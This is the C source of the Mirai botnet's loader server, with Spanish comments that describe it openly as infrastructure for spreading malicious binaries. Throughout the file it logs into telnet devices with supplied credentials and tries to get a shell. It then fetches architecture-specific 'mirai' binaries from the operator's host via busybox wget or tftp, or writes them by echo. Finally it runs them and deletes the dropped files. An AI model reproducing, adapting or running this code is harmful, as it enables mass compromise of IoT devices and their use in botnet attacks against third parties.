/**************************************************************************
 * Archivo: server.c
 * Descripción: Implementación del servidor de carga del botnet Mirai.
 * Este módulo maneja la infraestructura del servidor que gestiona las conexiones
 * telnet, la distribución de binarios maliciosos y el control de los bots.
 * 
 * Características principales:
 * - Servidor multihilo con balanceo de carga
 * - Gestión de conexiones telnet entrantes
 * - Carga de binarios maliciosos según arquitectura
 * - Sistema de timeout para conexiones inactivas
 **************************************************************************/

#define _GNU_SOURCE  /* Necesario para usar características extendidas de GNU/Linux */

/***************************************************************************
 * Inclusión de cabeceras estándar de C y POSIX
 * - stdio.h:       Operaciones de entrada/salida estándar
 * - stdlib.h:      Funciones de utilidad general (malloc, free, etc)
 * - pthread.h:     Soporte para programación multi-hilo
 * - sys/epoll.h:   API de E/S multiplexada de alto rendimiento
 * - sys/socket.h:  API de sockets para comunicación en red
 * - arpa/inet.h:   Funciones de conversión de direcciones IP
 * - string.h:      Manipulación de cadenas y memoria
 * - sched.h:       Planificación de procesos y afinidad de CPU
 * - errno.h:       Códigos de error del sistema
 ***************************************************************************/
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sched.h>
#include <errno.h>

/***************************************************************************
 * Inclusión de cabeceras propias del proyecto
 * - includes.h:     Definiciones y macros comunes del proyecto
 * - server.h:       Estructuras y prototipos del servidor
 * - telnet_info.h:  Gestión de sesiones telnet y credenciales
 * - connection.h:   Manejo de conexiones y estado de las sesiones
 * - binary.h:       Gestión de binarios específicos por arquitectura
 * - util.h:         Funciones de utilidad general
 ***************************************************************************/
#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/connection.h"
#include "headers/binary.h"
#include "headers/util.h"

/**
 * Crea y configura una nueva instancia del servidor
 * @param threads    Número de hilos trabajadores a crear
 * @param addr_len   Número de direcciones IP a las que vincular el servidor
 * @param addrs      Array de direcciones IPv4 para vincular
 * @param max_open   Número máximo de conexiones simultáneas permitidas
 * @param wghip      Dirección IP del servidor wget
 * @param wghp       Puerto del servidor wget
 * @param thip       Dirección IP del servidor TFTP
 * @return           Puntero a la estructura del servidor inicializada o NULL en caso de error
 */
struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
{
    struct server *srv = calloc(1, sizeof (struct server));        // Estructura principal del servidor
    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));  // Array de trabajadores
    int i;

    // Inicialización de la estructura del servidor
    srv->bind_addrs_len = addr_len;           // Número de direcciones IP para vincular
    srv->bind_addrs = addrs;                  // Array de direcciones IP
    srv->max_open = max_open;                 // Límite de conexiones simultáneas
    srv->wget_host_ip = wghip;                // IP del servidor wget para descargas
    srv->wget_host_port = wghp;               // Puerto del servidor wget
    srv->tftp_host_ip = thip;                 // IP del servidor TFTP alternativo
    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));  // Array de conexiones activas
    srv->workers = calloc(threads, sizeof (struct server_worker));          // Array de trabajadores
    srv->workers_len = threads;               // Número total de hilos trabajadores

    // Verifica la asignación exitosa del array de conexiones
    if (srv->estab_conns == NULL)
    {
        printf("Error al asignar el array de conexiones establecidas\n");
        exit(0);
    }

    // Asigna los mutex de sincronización internamente
    for (i = 0; i < max_open * 2; i++)
    {
        // Asigna memoria para cada estructura de conexión
        srv->estab_conns[i] = calloc(1, sizeof (struct connection));
        if (srv->estab_conns[i] == NULL)
        {
            printf("Error al asignar la conexión %d\n", i);
            exit(-1);
        }
        // Inicializa el mutex para la sincronización de la conexión
        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);
    }

    // Crea los hilos trabajadores que manejarán las conexiones
    for (i = 0; i < threads; i++)
    {
        // Obtiene el puntero al trabajador actual
        struct server_worker *wrker = &srv->workers[i];

        // Inicializa los datos del trabajador
        wrker->srv = srv;          // Referencia al servidor principal
        wrker->thread_id = i;      // Identificador único del hilo

        // Crea un nuevo contexto epoll para este trabajador
        if ((wrker->efd = epoll_create1(0)) == -1)
        {
            printf("Error al inicializar el contexto epoll. Código de error %d\n", errno);
            free(srv->workers);
            free(srv);
            return NULL;
        }

        // Crea el hilo trabajador
        pthread_create(&wrker->thread, NULL, worker, wrker);
    }

    pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);

    return srv;
}

/**
 * Libera todos los recursos asociados con una instancia del servidor
 * Esta función se encarga de la limpieza y liberación de memoria
 * cuando el servidor se cierra.
 * 
 * @param srv    Puntero a la estructura del servidor a destruir
 */
void server_destroy(struct server *srv)
{
    if (srv == NULL)
        return;
    if (srv->bind_addrs != NULL)            // Libera el array de direcciones IP
        free(srv->bind_addrs);
    if (srv->workers != NULL)               // Libera el array de trabajadores
        free(srv->workers);
    free(srv);                              // Libera la estructura principal
}

/**
 * Encola una nueva conexión telnet para ser procesada
 * Esta función implementa el control de concurrencia para asegurar
 * que no se exceda el límite máximo de conexiones simultáneas.
 * 
 * @param srv     Puntero al servidor
 * @param info    Información de la conexión telnet a procesar
 */
void server_queue_telnet(struct server *srv, struct telnet_info *info)
{
    // Espera hasta que haya espacio disponible para una nueva conexión
    while (ATOMIC_GET(&srv->curr_open) >= srv->max_open)
    {
        sleep(1);  // Espera 1 segundo antes de verificar nuevamente
    }
    // Incrementa atómicamente el contador de conexiones abiertas
    ATOMIC_INC(&srv->curr_open);

    if (srv == NULL)
        printf("Error: srv es NULL (3)\n");

    // Inicia el sondeo de la conexión telnet
    server_telnet_probe(srv, info);
}

/**
 * Inicia un sondeo de conexión telnet a un objetivo específico
 * Esta función intenta establecer una conexión con el dispositivo objetivo
 * y prepara la estructura necesaria para el proceso de infección.
 * 
 * @param srv   Puntero al servidor
 * @param info  Información de conexión telnet (credenciales, IP, etc.)
 */
void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    // Crea y vincula un socket para la conexión
    int fd = util_socket_and_bind(srv);
    struct sockaddr_in addr;           // Estructura para la dirección del objetivo
    struct connection *conn;           // Estructura de la conexión
    struct epoll_event event;          // Evento epoll para monitoreo
    int ret;
    // Selecciona un trabajador de forma rotativa para balancear la carga
    struct server_worker *wrker = &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];

    // Verifica si la creación del socket falló
    if (fd == -1)
    {
        // Imprime error solo cada 10 segundos para evitar spam
        if (time(NULL) % 10 == 0)
        {
            printf("Error al abrir y vincular el socket\n");
        }
        ATOMIC_DEC(&srv->curr_open);  // Decrementa el contador de conexiones
        return;
    }
    // Verifica si el descriptor de archivo es demasiado grande
    while (fd >= (srv->max_open * 2))
    {
        printf("Descriptor de archivo demasiado grande\n");
        conn->fd = fd;
#ifdef DEBUG
        printf("No se puede utilizar el socket porque el buffer del cliente no es lo suficientemente grande\n");
#endif
        connection_close(conn);
        return;
    }

    if (srv == NULL)
        printf("srv == NULL 4\n");

    conn = srv->estab_conns[fd];
    memcpy(&conn->info, info, sizeof (struct telnet_info));
    conn->srv = srv;
    conn->fd = fd;
    connection_open(conn);

    // Configura la estructura de dirección para la conexión
    addr.sin_family = AF_INET;                // Familia de direcciones IPv4
    addr.sin_addr.s_addr = info->addr;        // Dirección IP del objetivo
    addr.sin_port = info->port;               // Puerto del servicio telnet
    
    // Intenta establecer la conexión de manera no bloqueante
    ret = connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
    if (ret == -1 && errno != EINPROGRESS)    // EINPROGRESS es normal en modo no bloqueante
    {
        printf("Error al intentar conectar\n");
    }

    event.data.fd = fd;
    event.events = EPOLLOUT;
    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);
}

/**
 * Vincula un hilo a un núcleo específico de la CPU
 * Esta función se utiliza para mejorar el rendimiento distribuyendo
 * la carga entre los núcleos disponibles del procesador.
 * 
 * @param core    Número del núcleo al que vincular el hilo (0-based)
 */
static void bind_core(int core)
{
    pthread_t tid = pthread_self();          // Obtiene el ID del hilo actual
    cpu_set_t cpuset;                        // Máscara de CPUs
    CPU_ZERO(&cpuset);                       // Limpia la máscara
    CPU_SET(core, &cpuset);                  // Establece el núcleo deseado
    if (pthread_setaffinity_np(tid, sizeof (cpu_set_t), &cpuset) != 0)
        printf("Error al vincular al núcleo %d\n", core);
}

/**
 * Función principal de los hilos trabajadores
 * Cada trabajador maneja múltiples conexiones usando epoll para
 * multiplexación de E/S eficiente.
 * 
 * @param arg    Puntero a la estructura server_worker del trabajador
 * @return       NULL (el hilo se ejecuta indefinidamente)
 */
static void *worker(void *arg)
{
    struct server_worker *wrker = (struct server_worker *)arg;
    struct epoll_event events[128];          // Buffer para eventos epoll

    bind_core(wrker->thread_id);             // Vincula el hilo a un núcleo específico

    // Bucle principal del trabajador
    while (TRUE)
    {
        // Espera eventos en las conexiones monitoreadas
        int i, n = epoll_wait(wrker->efd, events, 127, -1);

        if (n == -1)
            perror("Error en epoll_wait");

        // Procesa todos los eventos recibidos
        for (i = 0; i < n; i++)
            handle_event(wrker, &events[i]);
    }
}

/**
 * Maneja los eventos epoll para una conexión específica
 * Esta función es el núcleo del servidor, procesando todos los eventos
 * de E/S y manejando el protocolo telnet, la carga de binarios y
 * la ejecución de comandos en los dispositivos objetivo.
 * 
 * @param wrker    Puntero al trabajador que maneja el evento
 * @param ev       Puntero al evento epoll a procesar
 */
static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
{
    // Obtiene la conexión asociada al descriptor de archivo
    struct connection *conn = wrker->srv->estab_conns[ev->data.fd];

    // Verifica si el descriptor es inválido
    if (conn->fd == -1)
    {
        conn->fd = ev->data.fd;
        connection_close(conn);
        return;
    }

    if (conn->fd != ev->data.fd)
    {
        printf("yo socket mismatch\n");
    }

    // Verifica si ocurrió algún error en la conexión
    if (ev->events & EPOLLERR || ev->events & EPOLLHUP || ev->events & EPOLLRDHUP)
    {
        // EPOLLERR: Error en la conexión
        // EPOLLHUP: El otro extremo cerró la conexión
        // EPOLLRDHUP: El otro extremo cerró la parte de lectura
#ifdef DEBUG
        if (conn->open)
            printf("[FD%d] Se encontró un error y se debe cerrar la conexión\n", ev->data.fd);
#endif
        connection_close(conn);  // Cierra y limpia la conexión
        return;
    }

    // Verifica si podemos escribir (conexión establecida)
    if (conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)
    {
        struct epoll_event event;

        // Verifica si hubo error durante la conexión asíncrona
        int so_error = 0;
        socklen_t len = sizeof(so_error);
        // Obtiene el estado del socket para verificar errores de conexión
        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
        if (so_error)
        {
#ifdef DEBUG
            printf("[FD%d] Connection refused\n", ev->data.fd);
#endif
            connection_close(conn);
            return;
        }

#ifdef DEBUG
        printf("[FD%d] Established connection\n", ev->data.fd);
#endif
        event.data.fd = conn->fd;
        event.events = EPOLLIN | EPOLLET;
        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);
        conn->state_telnet = TELNET_READ_IACS;
        conn->timeout = 30;
    }

    /* Verificación de seguridad: socket debe estar abierto */
    if (!conn->open)
    {
        printf("Error: Socket cerrado. FD actual: %d, FD evento: %d, eventos: %08x, estado: %08x\n", 
               conn->fd, ev->data.fd, ev->events, conn->state_telnet);
    }

    /* 
     * Procesamiento de datos entrantes
     * Solo procede si:
     * 1. El evento es EPOLLIN (datos disponibles para lectura)
     * 2. La conexión está activa (socket abierto)
     */
    if (ev->events & EPOLLIN && conn->open)
    {
        int ret;

        // Actualiza el timestamp de la última recepción de datos
        conn->last_recv = time(NULL);
        
        // Bucle de lectura: lee todos los datos disponibles
        while (TRUE)
        {
            // Intenta leer datos al final del buffer, evitando señales interrumpidas
            ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, 
                      sizeof (conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
            if (ret <= 0)
            {
                if (errno != EAGAIN && errno != EWOULDBLOCK)
                {
#ifdef DEBUG
                    if (conn->open)
                        printf("[FD%d] Encountered error %d. Closing\n", ev->data.fd, errno);
#endif
                    connection_close(conn);
                }
                break;
            }
#ifdef DEBUG
            printf("TELIN: %.*s\n", ret, conn->rdbuf + conn->rdbuf_pos);
#endif
            conn->rdbuf_pos += ret;
            conn->last_recv = time(NULL);

            if (conn->rdbuf_pos > 8196)
			{
                printf("oversized buffer pointer!\n");
				abort();
			}

            while (TRUE)
            {
                int consumed;

                switch (conn->state_telnet)
                {
                    case TELNET_READ_IACS:
                        // Procesa los comandos IAC (Interpret As Command) del protocolo telnet
                        consumed = connection_consume_iacs(conn);
                        if (consumed)
                            conn->state_telnet = TELNET_USER_PROMPT;  // Avanza al prompt de usuario
                        break;
                    case TELNET_USER_PROMPT:
                        // Espera y procesa el prompt de inicio de sesión
                        consumed = connection_consume_login_prompt(conn);
                        if (consumed)
                        {
                            // Envía el nombre de usuario
                            util_sockprintf(conn->fd, "%s", conn->info.user);
                            // Prepara el retorno de carro para enviar después
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            // Avanza al estado de prompt de contraseña
                            conn->state_telnet = TELNET_PASS_PROMPT;
                        }
                        break;
                    case TELNET_PASS_PROMPT:
                        // Espera y procesa el prompt de contraseña
                        consumed = connection_consume_password_prompt(conn);
                        if (consumed)
                        {
                            // Envía la contraseña
                            util_sockprintf(conn->fd, "%s", conn->info.pass);
                            // Prepara el retorno de carro
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            // Avanza al estado de espera post-contraseña
                            conn->state_telnet = TELNET_WAITPASS_PROMPT; // Como mínimo imprimirá ALGO
                        }
                        break;
                    case TELNET_WAITPASS_PROMPT:
                        // Espera respuesta después de enviar la contraseña
                        if ((consumed = connection_consume_prompt(conn)) > 0)
                        {
                            // Intenta elevar privilegios y acceder a shell
                            util_sockprintf(conn->fd, "enable\r\n");  // Activa modo privilegiado
                            util_sockprintf(conn->fd, "shell\r\n");   // Solicita shell
                            util_sockprintf(conn->fd, "sh\r\n");      // Alternativa de shell
                            conn->state_telnet = TELNET_CHECK_LOGIN;
                        }
                        break;
                    case TELNET_CHECK_LOGIN:
                        // Verifica si tenemos un prompt válido después de intentar obtener shell
                        if ((consumed = connection_consume_prompt(conn)) > 0)
                        {
                            // Envía una consulta de verificación
                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_VERIFY_LOGIN;
                        }
                        break;
                    case TELNET_VERIFY_LOGIN:
                        // Verifica si el login fue exitoso mediante token de respuesta
                        consumed = connection_consume_verify_login(conn);
                        if (consumed)
                        {
                            // Incrementa contador de logins exitosos
                            ATOMIC_INC(&wrker->srv->total_logins);
#ifdef DEBUG
                            printf("[FD%d] Inicio de sesión exitoso\n", ev->data.fd);
#endif
                            // Lista procesos y verifica con token
                            util_sockprintf(conn->fd, "/bin/busybox ps; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_PARSE_PS;
                        }
                        break;
                    case TELNET_PARSE_PS:
                        // Analiza la salida del comando 'ps' para identificar procesos
                        if ((consumed = connection_consume_psoutput(conn)) > 0)
                        {
                            // Obtiene lista de sistemas de archivos montados
                            util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_PARSE_MOUNTS;
                        }
                        break;
                    case TELNET_PARSE_MOUNTS:
                        // Analiza los puntos de montaje para encontrar directorios escribibles
                        consumed = connection_consume_mounts(conn);
                        if (consumed)
                            // Avanza al estado de búsqueda de directorios escribibles
                            conn->state_telnet = TELNET_READ_WRITEABLE;
                        break;
                    case TELNET_READ_WRITEABLE:
                        // Busca y verifica directorios con permisos de escritura
                        consumed = connection_consume_written_dirs(conn);
                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Directorio escribible encontrado: %s/\n", ev->data.fd, conn->info.writedir);
#endif
                            // Cambia al directorio escribible
                            util_sockprintf(conn->fd, "cd %s/\r\n", conn->info.writedir, conn->info.writedir);
                            // Copia el binario echo, lo vacía y establece permisos
                            util_sockprintf(conn->fd, "/bin/busybox cp /bin/echo " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                            // Avanza al estado de copia del binario echo
                            conn->state_telnet = TELNET_COPY_ECHO;
                            conn->timeout = 120;  // Aumenta el timeout para la operación de copia
                        }
                        break;
                    case TELNET_COPY_ECHO:
                        consumed = connection_consume_copy_op(conn);
                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Finished copying /bin/echo to cwd\n", conn->fd);
#endif
                            if (!conn->info.has_arch)
                            {
                                conn->state_telnet = TELNET_DETECT_ARCH;
                                conn->timeout = 120;
                                // DO NOT COMBINE THESE
                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/echo\r\n");
                                util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                            }
                            else
                            {
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                                conn->timeout = 15;
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            }
                        }
                        break;
                    case TELNET_DETECT_ARCH:
                        // Detecta la arquitectura del sistema objetivo
                        consumed = connection_consume_arch(conn);
                        if (consumed)
                        {
                            conn->timeout = 15;  // Establece timeout para la detección
                            // Intenta obtener el binario específico para la arquitectura
                            if ((conn->bin = binary_get_by_arch(conn->info.arch)) == NULL)
                            {
#ifdef DEBUG
                                printf("[FD%d] No se puede determinar la arquitectura\n", conn->fd);
#endif
                                connection_close(conn);  // Cierra la conexión si no se puede determinar
                            }
                            else if (strcmp(conn->info.arch, "arm") == 0)
                            {
#ifdef DEBUG
                                printf("[FD%d] Determinando subtipo de ARM\n", conn->fd);
#endif
                                util_sockprintf(conn->fd, "cat /proc/cpuinfo; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_ARM_SUBTYPE;
                            }
                            else
                            {
#ifdef DEBUG
                                printf("[FD%d] Detected architecture: '%s'\n", ev->data.fd, conn->info.arch);
#endif
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                            }
                        }
                        break;
                    case TELNET_ARM_SUBTYPE:
                        if ((consumed = connection_consume_arm_subtype(conn)) > 0)
                        {
                            struct binary *bin = binary_get_by_arch(conn->info.arch);

                            if (bin == NULL)
                            {
#ifdef DEBUG
                                printf("[FD%d] We do not have an ARMv7 binary, so we will try using default ARM\n", conn->fd);
#endif
                            }
                            else
                                conn->bin = bin;

                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_UPLOAD_METHODS;
                        }
                        break;
                    case TELNET_UPLOAD_METHODS:
                        // Determina los métodos de carga disponibles en el sistema
                        consumed = connection_consume_upload_methods(conn);

                        if (consumed)
                        {
#ifdef DEBUG
                            printf("[FD%d] Método de carga es ", conn->fd);
#endif
                            switch (conn->info.upload_method)
                            {
                                case UPLOAD_ECHO:
                                    // Método de carga usando el comando echo
                                    conn->state_telnet = TELNET_UPLOAD_ECHO;
                                    conn->timeout = 30;  // Timeout para la carga
                                    // Prepara el archivo temporal y establece permisos
                                    util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
#ifdef DEBUG
                                    printf("echo\n");
#endif
                                    break;
                                case UPLOAD_WGET:
                                    // Método de carga usando wget
                                    conn->state_telnet = TELNET_UPLOAD_WGET;
                                    conn->timeout = 120;  // Timeout extendido para descarga
                                    // Descarga el binario específico de arquitectura usando wget
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
#ifdef DEBUG
                                    printf("wget\n");
#endif
                                    break;
                                case UPLOAD_TFTP:
                                    // Método de carga usando TFTP (más común en dispositivos embebidos)
                                    conn->state_telnet = TELNET_UPLOAD_TFTP;
                                    conn->timeout = 120;  // Timeout extendido para descarga
                                    // Descarga el binario usando TFTP y establece permisos
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    FN_BINARY, "mirai", conn->info.arch, wrker->srv->tftp_host_ip);
#ifdef DEBUG
                                    printf("tftp\n");
#endif
                                    break;
                            }
                        }
                        break;
                    case TELNET_UPLOAD_ECHO:   
                        consumed = connection_upload_echo(conn);
                        if (consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished echo loading!\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./%s; ./%s %s.%s; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_echoes);
                        }
                        break;
                    case TELNET_UPLOAD_WGET:
                        consumed = connection_upload_wget(conn);
                        if (consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished wget loading\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_wgets);
                        }
                        break;
                    case TELNET_UPLOAD_TFTP:
                        consumed = connection_upload_tftp(conn);
                        if (consumed > 0)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 30;
#ifdef DEBUG
                            printf("[FD%d] Finished tftp loading\n", conn->fd);
#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.%s; " EXEC_QUERY "\r\n", id_tag, conn->info.arch);
                            ATOMIC_INC(&wrker->srv->total_tftps);
                        }
                        else if (consumed < -1) // Did not have permission to TFTP
                        {
#ifdef DEBUG
                            printf("[FD%d] No permission to TFTP load, falling back to echo!\n", conn->fd);
#endif
                            consumed *= -1;
                            conn->state_telnet = TELNET_UPLOAD_ECHO;
                            conn->info.upload_method = UPLOAD_ECHO;

                            conn->timeout = 30;
                            util_sockprintf(conn->fd, "/bin/busybox cp "FN_BINARY " " FN_DROPPER "; > " FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                        }
                        break;
                    case TELNET_RUN_BINARY:
                        // Verifica la ejecución exitosa del payload
                        if ((consumed = connection_verify_payload(conn)) > 0)
                        {
                            // Un valor >= 255 indica ejecución exitosa
                            if (consumed >= 255)
                            {
                                conn->success = TRUE;
#ifdef DEBUG
                                printf("[FD%d] Payload ejecutado exitosamente\n", conn->fd);
#endif
                                consumed -= 255;  // Ajusta el valor consumido
                            }
                            else
                            {
#ifdef DEBUG
                                printf("[FD%d] Falló la ejecución del payload\n", conn->fd);
#endif
                                if (!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)
                                {
                                    conn->echo_load_pos = 0;
                                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                                    conn->bin = binary_get_by_arch(conn->info.arch);
                                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                                    conn->retry_bin = TRUE;
                                    break;
                                }
                            }
#ifndef DEBUG
                            util_sockprintf(conn->fd, "rm -rf " FN_DROPPER "; > " FN_BINARY "; " TOKEN_QUERY "\r\n");
#else
                            util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
#endif
                            conn->state_telnet = TELNET_CLEANUP;
                            conn->timeout = 10;
                        }
                        break;
                    case TELNET_CLEANUP:
                        /* 
                         * Estado final del proceso de infección. Se encarga de:
                         * - Eliminar archivos temporales utilizados (binarios y dropper)
                         * - Limpiar cualquier rastro de la ejecución
                         * - Cerrar la conexión de manera limpia
                         * - En modo DEBUG, reportar el éxito de la limpieza
                         */
                        if ((consumed = connection_consume_cleanup(conn)) > 0)
                        {
                            int tfd = conn->fd;  // Guarda el descriptor para log de debug

                            connection_close(conn);  // Cierra la conexión y libera recursos
#ifdef DEBUG
                            printf("[FD%d] Archivos temporales eliminados y conexión cerrada\n", tfd);
#endif
                        }
                    default:
                        // Estado no reconocido o no implementado
                        // Retorna 0 para indicar que no se consumieron datos
                        consumed = 0;
                        break;
                }

                // Si no se consumieron datos, sale del bucle de procesamiento
                /*
                 * Control de flujo del procesamiento de datos
                 * - Si no se consumieron datos (consumed == 0), sale del bucle
                 * - Si se consumieron datos, actualiza el buffer circularmente
                 */
                if (consumed == 0)
                    break;
                else
                {
                    /* Validación de seguridad para prevenir desbordamientos */
                    if (consumed > conn->rdbuf_pos)
                    {
                        consumed = conn->rdbuf_pos;  // Limita al máximo disponible
                        //printf("Advertencia! Intento de consumir más datos que los disponibles\n");
                        //abort();
                    }

                    /* 
                     * Gestión del buffer circular:
                     * 1. Actualiza el puntero de posición
                     * 2. Compacta el buffer moviendo datos no consumidos al inicio
                     * 3. Asegura terminación null para seguridad
                     */
                    conn->rdbuf_pos -= consumed;
                    memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                    conn->rdbuf[conn->rdbuf_pos] = 0;
                }

                /* 
                 * Comprobación crítica de seguridad:
                 * Previene desbordamientos de buffer verificando que no se exceda
                 * el tamaño máximo permitido (8196 bytes). Este límite es crucial
                 * para evitar corrupción de memoria y potenciales vulnerabilidades.
                 */
                if (conn->rdbuf_pos > 8196)
                {
                    printf("Error crítico! Desbordamiento del buffer detectado\n");
                    abort();  // Termina el programa de forma segura
                }
            }
        }
    }  /* 
        * Fin del manejador de eventos EPOLLIN
        * En este punto, todos los datos disponibles han sido procesados
        * y el estado de la conexión ha sido actualizado según corresponda
        */
}

/**
 * Hilo que maneja los timeouts de las conexiones
 * Este hilo se encarga de cerrar conexiones inactivas y manejar
 * reintentos de conexión cuando sea necesario. También maneja
 * el envío de datos pendientes en los buffers de salida.
 * 
 * @param arg    Puntero al servidor (cast a void*)
 * @return       NULL (el hilo se ejecuta indefinidamente)
 */
static void *timeout_thread(void *arg)
{
    struct server *srv = (struct server *)arg;
    int i, ct;    // ct = tiempo actual

    while (TRUE)
    {
        ct = time(NULL);

        for (i = 0; i < (srv->max_open * 2); i++)
        {
            struct connection *conn = srv->estab_conns[i];

            if (conn->open && conn->last_recv > 0 && ct - conn->last_recv > conn->timeout)
            {
#ifdef DEBUG
                printf("[FD%d] Timed out\n", conn->fd);
#endif
                if (conn->state_telnet == TELNET_RUN_BINARY && !conn->ctrlc_retry && strncmp(conn->info.arch, "arm", 3) == 0)
                {
                    conn->last_recv = time(NULL);
                    util_sockprintf(conn->fd, "\x03\x1Akill %%1\r\nrm -rf " FN_BINARY " " FN_DROPPER "\r\n");
                    conn->ctrlc_retry = TRUE;

                    conn->echo_load_pos = 0;
                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                    conn->bin = binary_get_by_arch(conn->info.arch);
                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                    conn->retry_bin = TRUE;
                } else {
                    connection_close(conn);
                }
            } else if (conn->open && conn->output_buffer.deadline != 0 && time(NULL) > conn->output_buffer.deadline)
            {
                // Si hay datos pendientes en el buffer y se alcanzó el deadline
                conn->output_buffer.deadline = 0;  // Reinicia el deadline
                // Envía los datos pendientes
                util_sockprintf(conn->fd, conn->output_buffer.data);
            }
        }

        // Espera 1 segundo antes de la siguiente iteración de verificación
        sleep(1);
    }  // Fin del bucle infinito del hilo de timeout
}

